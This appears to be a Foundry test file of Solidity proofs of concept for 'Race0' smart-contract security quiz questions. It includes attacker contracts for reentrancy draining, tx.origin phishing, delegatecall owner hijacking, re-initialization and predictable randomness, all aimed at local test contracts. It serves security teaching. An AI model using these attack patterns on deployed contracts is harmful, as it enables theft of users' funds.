// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {Test, console, stdError} from "forge-std/Test.sol";
import {R0_Q2, 
        R0_Q3, 
        R0_Q4, 
        R0_Q5, 
        R0_Q7, 
        R0_Q8, 
        R0_Q9, 
        R0_Q10, 
        R0_Q11, 
        R0_Q11_Ownable2Step, 
        R0_Q12,
        R0_Q13,
        R0_Q13_V2,
        R0_Q14,
        R0_Q15} from "../src/Race0.sol";

// import ERC1967Proxy for upgradable contract tests
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { ERC20Mock } from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import { ERC20ReturnFalseMock } from "@openzeppelin/contracts/mocks/token/ERC20ReturnFalseMock.sol";

contract R0_Q2_Test is Test {
    R0_Q2 public r0_q2;

    function setUp() public {
        // deploy the contract
        r0_q2 = new R0_Q2();

        // check the balance of the 0x0 address
        assertEq(address(0x0).balance, 0);

        // send eth to the contract
        address(r0_q2).call{value: 1 ether}("");

        // check contract baalance 
        assertEq(address(r0_q2).balance, 1 ether);

        // check the bytecode
        assertGt(address(r0_q2).code.length, 0);

        /* 
            call kill function (which calls selfdestruct)
            called in setUp so the transaction can complete
            and the bytecode is removed before test_destroyed
            function is executed.
            
            See discussion here for more details: 
            https://github.com/foundry-rs/foundry/issues/1543
        */ 
        r0_q2.kill();
    }

    function test_destroyed() public {
        // check contract balance is zero
        assertEq(address(r0_q2).balance, 0);

        // check address zero has 1 ether (sent from selfdestruct)
        assertEq(address(0x0).balance, 1 ether);

        // check the bytecode size is zero
        assertEq(address(r0_q2).code.length, 0);

        // call kill function reverts since bytecode is erased
        vm.expectRevert();
        r0_q2.kill();
    }
}

contract R0_Q3_Test is Test {
    R0_Q3 r0_q3;
    address attacker = makeAddr("attacker");
    uint256 depositAmount = 1 ether;
    address owner;

    function setUp() public {
        r0_q3 = new R0_Q3();
        owner = r0_q3.owner();
        address(r0_q3).call{value: depositAmount}("");
    }

    function test_anyoneCanCallTransferFunds() public {
        vm.prank(attacker);
        r0_q3.transferFunds(payable(attacker), depositAmount);

        assertEq(address(r0_q3).balance, 0);
        assertEq(address(attacker).balance, depositAmount);
    }

    function test_transferFundsCanRevert() public {
        vm.expectRevert();
        r0_q3.transferFunds(payable(address(this)), depositAmount);
    }

    // only run this test when the onlyAdmin is applied to transferFunds function
    function xtest_onlyAdminCanCallTransferFundsWhenFixed() public {
        vm.prank(attacker);
        vm.expectRevert("unauthorized");
        r0_q3.transferFunds(payable(attacker), depositAmount);
        

        vm.prank(owner);
        r0_q3.transferFunds(payable(owner), depositAmount);
        assertEq(address(r0_q3).balance, 0);
        assertEq(address(owner).balance, depositAmount);       
    }
}

contract R0_Q4_Test is Test {
    R0_Q4 r0_q4;
    address testAddr = makeAddr("testAddr");

    function setUp() public {
        r0_q4 = new R0_Q4();

        // set address id 0 to testAddr
        r0_q4.setAddress(0, testAddr);
    }

    function test_getAddressReturnesZeroAddressWhenCheckIsFALSE() public {
        /* 
            check is false (by default) so the code in the getAddress function body
            will not be executed and therefore the default value for address type is returened
        */
        assertEq(r0_q4.getAddress(0), address(0x0));
    }
    function test_getAddressReturnesExpectedAddressWhenCheckIsTRUE() public {
        // set the check flag to true
        r0_q4.setCheck(true);

        // calling getAddress returnes the expected address
        assertEq(r0_q4.getAddress(0), testAddr);
    }
}

contract R0_Q5_Test is Test {
    R0_Q5 r0_q5;
    R0_Q5_Attacker attackContract;
    R0_Q5_Revert revertContract;
    address attacker = address(0xc3e3a0be380b435c14B6aDB7aB8b8b56eB5Cc6eb);

    function setUp() public {
        r0_q5 = new R0_Q5();
        attackContract  = new R0_Q5_Attacker();
        revertContract  = new R0_Q5_Revert();
    }

    function test_potentialControlledDelegatecallRisk() public {    
        // before calling the delegate restrictedFunction cannot be called 
        vm.prank(attacker);
        vm.expectRevert("unauthorized");
        r0_q5.restrictedFunction();

        // call delegate passing the attacers contract to change the owenr address in the target
        r0_q5.delegate(address(attackContract));
        
        // now the attacker can call the restrictedFunction without any issues!
        vm.prank(attacker);
        r0_q5.restrictedFunction();
    }

    function test_delegatecallReturnValueIsNotChecked() public {
        // calling delegate with a contract definition of setDelay that reverts
        // will not cause the top level call to revert
        r0_q5.delegate(address(revertContract));
    }

    function test_delegateDoesNotCheckForContractExistenceAtAddr() public {
        // call delegate with an address that does not have contract deployed 
        // will NOT revert at any level in the call stack
        r0_q5.delegate(address(0x0));
    }
}

contract R0_Q5_Attacker {
    address private slot0Placeholder; // slot 0

    function setDelay(uint256 _value) public {
        slot0Placeholder = address(0xc3e3a0be380b435c14B6aDB7aB8b8b56eB5Cc6eb);
    }
}

contract R0_Q5_Revert {
    function setDelay(uint256 _value) public {
        revert("call to setDelay reverted");
    }
}

contract R0_Q7_Test is Test {
    R0_Q7 r0_q7;

    function setUp() public {
        r0_q7 = new R0_Q7();

        // for more realistic value of block.timestamp since in tests it defaults to 1
        vm.warp(1722591648); 
    }

    /*
        "The private variable secret is not really hidden from users"

        Since `secret` is a private constant we cannot 
        
            - call `r0_q7.secret()` (because its private)
            - call `vm.load(address(r0_q7), 0)` (becuase it is a constant which is stored inline
            in the bytecode).

        This meanss the compiled bytecode for R0_Q7 esstially looks like the following (NOTE: the 
        definition of `secret` is removed and the variable is replaced inline with the value 123):

        contract R0_Q7 {
            function diceRoll() external view returns (uint256) {
                return (((block.timestamp * 123) % 6) + 1);
            }
        }

        Therefore, the way to extract secret value is from the bytecode. We can
        use the following steps:

            - Extract the Bytecode: `address(r0_q7).code`
            - Analyze the Bytecode: we can use https://www.evm.codes/playground for this
            - Extract the Constant: look for where the value is pushed to the stack. In this example, 123 (0x7b)
            is pushd the stack just before the block.timestamp (TIMESTAMP) is pushed to the stack:

            PUSH1	    7b
            TIMESTAMP

        The full compiled bytecode for R0_Q7 is (go play around with it!):

        0x6080604052348015600f57600080fd5b506004361060285760003560e01c806370bddc8014602d575b600080fd5b60336045565b60405190815260200160405180910390f35b600060066052607b42607e565b605a9190609a565b606390600160bb565b905090565b634e487b7160e01b600052601160045260246000fd5b600081600019048311821515161560955760956068565b500290565b60008260b657634e487b7160e01b600052601260045260246000fd5b500690565b6000821982111560cb5760cb6068565b50019056fea26469706673582212203b6ba86e939984b6497b23faf4d2b4e55aa58fd0af1c56c9a9a932d2a69d6bb664736f6c634300080d0033
    */
    function test_privateVariableSecretIsNotReallyHiddenFromUsers() public {
        // call `r0_q7.secret()` (because its private)
        // Results in the folloing compile time error: 
        // Error (9582): Member "secret" not found or not visible after argument-dependent lookup in contract R0_Q7.
        // r0_q7.secret();

        // low level call will just return null (0x)
        (bool success, bytes memory dataFromCall) = address(r0_q7).call(abi.encodeWithSignature("secret()"));
        assertEq(success, false);
        assertEq(dataFromCall, "");

        // call `vm.load(address(r0_q7), 0)` will return empty slot data (0x0000...)
        bytes32 dataFromLoad = vm.load(address(r0_q7), 0);
        assertEq(dataFromLoad, 0x0000000000000000000000000000000000000000000000000000000000000000);

    }

    function test_blockTimestampIsAnInsecureSourceOfRandomness() public {
        // if the diceRoll is part of a game then its easy to 'guess' the outcome
        // by running the same code in the diceRoll function before calling it:
        uint256 calculatedGuess = ((block.timestamp * 123) % 6) + 1;
        assertEq(calculatedGuess, r0_q7.diceRoll());
        console.log(calculatedGuess);

        // skip time forward by 3455 seconds and try again (should always 'guess' correctly!)
        skip(3455);

        calculatedGuess = ((block.timestamp * 123) % 6) + 1;
        assertEq(calculatedGuess, r0_q7.diceRoll());

        console.log(calculatedGuess);
    }

    function test_logicOfDiceRollIsBrokenAsItReturnsOnly1Or4() public {
        // review the comment "The logic of diceRoll() is broken as it returns only 1 or 4"
        // one solution is to remove the secret factor altogether
        assertEq(fixedRollDiceFunction(), 1);
        skip(1); // moves block.timestamp forward by 1 second 
        assertEq(fixedRollDiceFunction(), 2);
        skip(1);
        assertEq(fixedRollDiceFunction(), 3);
        skip(1);
        assertEq(fixedRollDiceFunction(), 4);
        skip(1);
        assertEq(fixedRollDiceFunction(), 5);
        skip(1);
        assertEq(fixedRollDiceFunction(), 6);
        skip(1);
        assertEq(fixedRollDiceFunction(), 1);
        skip(1);
        assertEq(fixedRollDiceFunction(), 2);
        // etc...
    }

    /* 
        fixedRollDiceFunction is an example of a function that works as expected
        it returns a number between 1 and 6 based on the current block.timestamp
        the fix is to remove the multiplication of block.timestamp by secret 
    */ 
    //
    function fixedRollDiceFunction() public returns (uint256) {
        return ((block.timestamp) % 6) + 1;
    }
}


contract R0_Q8_Test is Test {
    R0_Q8 r0_q8;
    R0_Q8_Attacker attackerContract;
    address attacker = makeAddr("attacker");
    uint256 depositAmount = 1 ether;
    uint256 donationAmount = 0.1 ether;

    function setUp() public {
        r0_q8 = new R0_Q8();
        attackerContract = new R0_Q8_Attacker(payable(r0_q8), attacker);

        // send deposit amount to R0_Q8
        address(r0_q8).call{value: depositAmount}("");
        // deal some ether to the admin
        vm.deal(r0_q8.admin(), donationAmount);
    }

    function test_PotentialManInTheMiddleAttackOnAdminAddressAuthentication() public {
        assertEq(address(r0_q8).balance, depositAmount);
        assertEq(attacker.balance, 0);
        
        // scenario - convince the admin of R0_Q8 to 'donate' to another contract
        // vm.prank here sets the msg.sender, tx.origin
        vm.prank(r0_q8.admin(), r0_q8.admin());
        attackerContract.donateToCharity{value: donationAmount}();

        // Attacker has all funds and R0_Q8 contract is drained
        assertEq(attacker.balance, depositAmount + donationAmount);
        assertEq(address(r0_q8).balance, 0);
    }
}

contract R0_Q8_Attacker {
    R0_Q8 r0_q8;
    address attacker;
    constructor(address payable _r0_q8Addr, address _attacker) {
        r0_q8 = R0_Q8(_r0_q8Addr);
        attacker = _attacker;
    }

    function donateToCharity() public payable {
        // call emergencyWithdraw in R0_Q8 contract 
        // if the admin of R0_Q8 calls this function then tx.origin will be their address
        // and the funds will be transfered to this contract!
        r0_q8.emergencyWithdraw();

        // send all funds to attacker wallet
        attacker.call{value: address(this).balance}("");
    }

    receive() external payable {}
}

contract R0_Q9_Test is Test {
    R0_Q9 r0_q9;
    address contributor = makeAddr("contributor");
    address attacker = makeAddr("attacker");

    function setUp() public {
        r0_q9 = new R0_Q9();
        vm.deal(contributor, 99 ether);
        vm.deal(attacker, 2 ether);
    }

    function test_UseOfStrictEqualityMayBreakTheMAX_FUND_RAISEConstraint() public {
        // R0_Q9 contract can endup holding more than the MAX_FUND_RAISE
        
        // assume legit contrinuters add 99 ether to R0_Q9
        vm.prank(contributor);
        r0_q9.contribute{value: 99 ether}();

        vm.prank(attacker);
        r0_q9.contribute{value: 1.1 ether}();

        // now R0_Q9 contract holds more than the expected MAX_FUND_RAISE (100 ether) amount
        assertGt(address(r0_q9).balance, 100 ether);
    }
}

contract R0_Q10_Test is Test {
    R0_Q10 r0_q10;
    address eoa = makeAddr("eoa");
    function setUp() public {
        r0_q10 = new R0_Q10();
    }

    function test_callMeRequireWillPassForANonExistentContractAddress() public {
        // calling with an eoa and not a contract will not cause a revert because 
        // sucess returned is true and so require(success) will pass
        r0_q10.callMe(eoa);
    }
}

contract R0_Q11_Test is Test {
    R0_Q11 r0_q11;
    R0_Q11_Ownable2Step r0_q11_Ownable2Step;
    address oldAdmin = makeAddr("oldAdmin");
    address newAdmin = makeAddr("newAdmin");

    function setUp() public {
        r0_q11 = new R0_Q11();

        // sets the owner address as the deployer account (oldAdmin)
        vm.prank(oldAdmin);
        r0_q11_Ownable2Step = new R0_Q11_Ownable2Step();
    }

    function test_SingleStepChangeOfCriticalAddress() public {
        // R0_Q11 allows updating the admin address in one step like so
        assertEq(r0_q11.admin(), 0x6C328AFB6172025FD0e6eF426f1c56624a00432C);

        // can update in one function call (note if newAdmin is 0x0 address this would 
        // succesed and potentially break the contract)
        r0_q11.setAdmin(newAdmin);
        assertEq(r0_q11.admin(), newAdmin);
    }


    function test_Ownable2StepProcess() public {
        // test the 2 step approach with the R0_Q11_Ownable2Step contract
        assertEq(r0_q11_Ownable2Step.owner(), oldAdmin);
        
        // initiate ownership transfer
        vm.prank(oldAdmin);
        r0_q11_Ownable2Step.transferOwnership(newAdmin);

        // confirm the owner has not changed yet (still oldAdmin)
        assertEq(r0_q11_Ownable2Step.owner(), oldAdmin);

        // however, pendingOwner is the newAdmin
        assertEq(r0_q11_Ownable2Step.pendingOwner(), newAdmin);

        // now the newAdmin needs to call acceptOwnership to conplete the transfer
        vm.prank(newAdmin);
        r0_q11_Ownable2Step.acceptOwnership();

        // confirm the owner is the newAdmin
        assertEq(r0_q11_Ownable2Step.owner(), newAdmin);
    }
}

contract R0_Q12_Test is Test {
    R0_Q12 r0_q12;
    address admin = makeAddr("admin");
    address liquidityProvider = makeAddr("liquidityProvider");

    function setUp() public {
        r0_q12 = new R0_Q12(admin);
        vm.deal(liquidityProvider, 10 ether);
    }

    function test_deployed() public {
        console.log(address(r0_q12));
    }

    function test_UninitializedPoolStorageVariable() public {
        // the pool address is not initialized
        assertEq(r0_q12.pool(), address(0x0));

        console.log(r0_q12.pool().balance);

        // which prevents the addLiquidity function from being called?
        assertEq(liquidityProvider.balance, 10 ether);

        vm.prank(liquidityProvider);
        r0_q12.addLiquidity{value: 1 ether}();

        // lp has lost the ether sent to the contract!
        assertEq(liquidityProvider.balance, 9 ether);
        
        // the zero address has the lost (burnt) ether
        assertEq(r0_q12.pool().balance, 1 ether);
    }
}



contract R0_Q13_Test is Test {
    R0_Q13 r0_q13_impl;
    R0_Q13 r0_q13;
    ERC1967Proxy r0_q13_proxy;
    address admin = makeAddr("admin");

    function setUp() public {
        // deploy the implementation contract
        r0_q13_impl = new R0_Q13();

        // deploy the proxy contract
        bytes memory data = abi.encodeWithSelector(R0_Q13.initialize.selector, admin);

        r0_q13_proxy = new ERC1967Proxy(address(r0_q13_impl), data);

        r0_q13 = R0_Q13(address(r0_q13_proxy));
    }

    // function test_deployed() public {
    //     console.log("Impl address", address(r0_q13_impl));
    //     console.log("Proxy address", address(r0_q13_proxy));
    //     console.log("Admin address", r0_q13.admin());
    // }

    function test_rewardsWillBeZeroInTheProxyContract() public {
        // the rewards is zero after deployment
        assertEq(r0_q13.rewards(), 0);
        // the setRewards function must be called by an admin to set it
        vm.prank(admin);
        r0_q13.setRewards(10);
        assertEq(r0_q13.rewards(), 10);
    }

    function test_MultipleInitializeCallsPossible() public {
        // initialze has already been called setting the default admin
        assertEq(r0_q13.admin(), admin);

        // however, nothing prevents ANYONE from calling the initialize function!
        address badAdmin = makeAddr("badAdmin");
        r0_q13.initialize(badAdmin);
        // now we have a 'bad admin'
        assertEq(r0_q13.admin(), badAdmin);
    }

    /*
        additional test to check the upgradability since our contract inherits UUPSUpgradeable
    */
    function test_UpgradeContract() public {
        // the impl address in r0_q13_proxy is still the r0_q13_impl contract addresss
        assertEq(helperGetProxyImplAddressFromSlot(), address(r0_q13_impl));

        R0_Q13_V2 r0_q13_v2 = R0_Q13_V2(address(r0_q13_proxy));
        // will revert because the proxy has not been upgraded to the new impl yet
        vm.expectRevert();
        r0_q13_v2.someNewFeature(); 

        // now deploy the new V2 implementation contract and upgrade the proxy
        R0_Q13_V2 r0_q13_v2_impl = new R0_Q13_V2();
        // the v2 initialize function does NOT take any params so the params is set to ""
        bytes memory data = abi.encodeWithSelector(R0_Q13_V2.initialize.selector, "");
        vm.prank(admin);
        r0_q13.upgradeToAndCall(address(r0_q13_v2_impl), data);
        
        // the impl address in the r0_q13_proxy is updated to the new v2 impl addresss
        assertEq(helperGetProxyImplAddressFromSlot(), address(r0_q13_v2_impl));

        // someNewFeature function is now callable via the proxy (does not revert anymore)
        assertEq(r0_q13_v2.someNewFeature(), "hello from new feature!");
    }

    function helperGetProxyImplAddressFromSlot() internal returns (address implAddressInProxy) {
        // ERC1967 Implementation Storage slot
        bytes32 erc1967ImplSlot = bytes32(uint256(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc));

        // Use vm.load to read the value at the storage slot
        implAddressInProxy = address(uint160(uint256((vm.load(address(r0_q13_proxy), erc1967ImplSlot)))));
    }
}

contract R0_Q14_Test is Test {
    R0_Q14 r0_q14;
    address admin = makeAddr("admin");
    ERC20Mock erc20Mock;
    uint256 constant ININTIAL_BALANCE = 1_000_000 ether;

    // create two new reward receipients and set the reward amount
    address recipient0 = makeAddr("recipient0");
    address recipient1 = makeAddr("recipient1");
    uint256 rewardAmount = ININTIAL_BALANCE / 2;

    // used to check revert reason
    error ERC20InvalidReceiver(address receiver);

    function setUp() public {
        erc20Mock = new ERC20Mock();
        r0_q14 = new R0_Q14(admin, address(erc20Mock));

        // mint 1M tokens to R0_Q14 to test payRewards
        erc20Mock.mint(address(r0_q14), ININTIAL_BALANCE);
    }

    // function test_deployed() public {
    //     console.log(address(r0_q14));
    //     console.log(address(erc20Mock));
    //     console.log(erc20Mock.totalSupply());
    // }

    function test_payRewards() public {
        // assert the r0_q14 contract holds the initial balance of tokens
        assertEq(erc20Mock.balanceOf(address(r0_q14)), ININTIAL_BALANCE);

        // assert that receipients do not hold any tokens
        assertEq(erc20Mock.balanceOf(recipient0), 0);
        assertEq(erc20Mock.balanceOf(recipient1), 0);

        // prepare the data to call the payRewards function
        address[] memory recipients = new address[](2);
        recipients[0] = recipient0;
        recipients[1] = recipient1;

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = rewardAmount;
        amounts[1] = rewardAmount;

        // admin calls payRewards function
        vm.prank(admin);
        r0_q14.payRewards(recipients, amounts);

        // check recipients hold the expected reward amount of tokens
        assertEq(erc20Mock.balanceOf(recipient0), rewardAmount);
        assertEq(erc20Mock.balanceOf(recipient1), rewardAmount);
    }

    function test_revertsDueToMismatchedLength() public {
        // prepare the data to call the payRewards function
        // purposely make recipients array larger than amounts array length
        address[] memory recipients = new address[](2);
        recipients[0] = recipient0;
        recipients[1] = recipient1;

        // make amounts a smaller array than recipients
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = rewardAmount;

        // admin calls payRewards function
        vm.prank(admin);
        // expect revert with 'array out-of-bounds access (0x32)' 
        // (use stdError.indexOOBError)
        vm.expectRevert(stdError.indexOOBError);
        r0_q14.payRewards(recipients, amounts);
    }

    function test_uncheckedReturnValueOfTransfer() public {
        address[] memory recipients = new address[](1);
        uint256[] memory amounts = new uint256[](1);

        vm.prank(admin);
        // the current ERC20Mock implements a transfer function that reverts on error
        // for example when transfer to a zero address will revert with ERC20InvalidReceiver error
        vm.expectRevert(abi.encodeWithSelector(ERC20InvalidReceiver.selector, address(0x0)));
        r0_q14.payRewards(recipients, amounts);

        // however, if the ERC20ReturnFalseMock is used the transfer function does not revert but instead returns false
        // in this situation the transfer could fail sliently
        MyBadToken erc20MockReturnFalse = new MyBadToken();
        // calling transfer will always return false and never revert
        assertFalse(erc20MockReturnFalse.transfer(address(0x123), 1 ether));
        // deploy a new contract that uses MyBadToken
        R0_Q14 r0_q14_returns_false = new R0_Q14(admin, address(erc20MockReturnFalse));
        vm.prank(admin);
        // no revert, fails silenntly if trasnfering real tokens
        r0_q14_returns_false.payRewards(recipients, amounts);
    }
}

contract MyBadToken is ERC20ReturnFalseMock {
    constructor() ERC20("MyBadToken", "MBT") {}
}

contract R0_Q15_Test is Test {
    R0_Q15 r0_q15;
    R0_Q15_Attacker r0_q15_attacker;
    uint256 constant INITIAL_DEPOSIT = 1 ether;

    function setUp() public {
        // deploy the target contract
        r0_q15 = new R0_Q15();
        // deploy the attacker contract
        r0_q15_attacker = new R0_Q15_Attacker(payable(r0_q15));
        // send 1 ether to the attacker contract so it can deposit it into the target
        payable(r0_q15_attacker).transfer(INITIAL_DEPOSIT);
        r0_q15_attacker.deposit();
        // confirm the target updated the internal accounts mapping
        assertEq(r0_q15.balances(address(r0_q15_attacker)), INITIAL_DEPOSIT);
        // transfer more Ether directly to the target contract for 
        // the attacker to drain during the reentrancy attack
        payable(r0_q15).transfer(10 ether);
    }

    function test_reentrancyAttack() public {
        // total balance of the target contract should be the 1 ether 
        // from the attacker + 10 ether 'donated' during deployment
        assertEq(address(r0_q15).balance, 11 ether);
        // attack the target contract
        r0_q15_attacker.attack();
        // assert target has been drained
        assertEq(address(r0_q15).balance, 0 ether);
        // assert attacker has all the ether
        assertEq(address(r0_q15_attacker).balance, 11 ether);
    }
}

contract R0_Q15_Attacker {
    R0_Q15 target;
    constructor(address payable _target) {
        target = R0_Q15(_target);
    }

    function deposit() external {
        target.deposit{value: 1 ether}();
    }

    function attack() public {
        // call withdrawBalance on the target
        target.withdrawBalance();
    }

    fallback() external payable {
        if (address(target).balance >= msg.value) {
            // keep attacking until target contract is drained
            attack();
        }
    }
}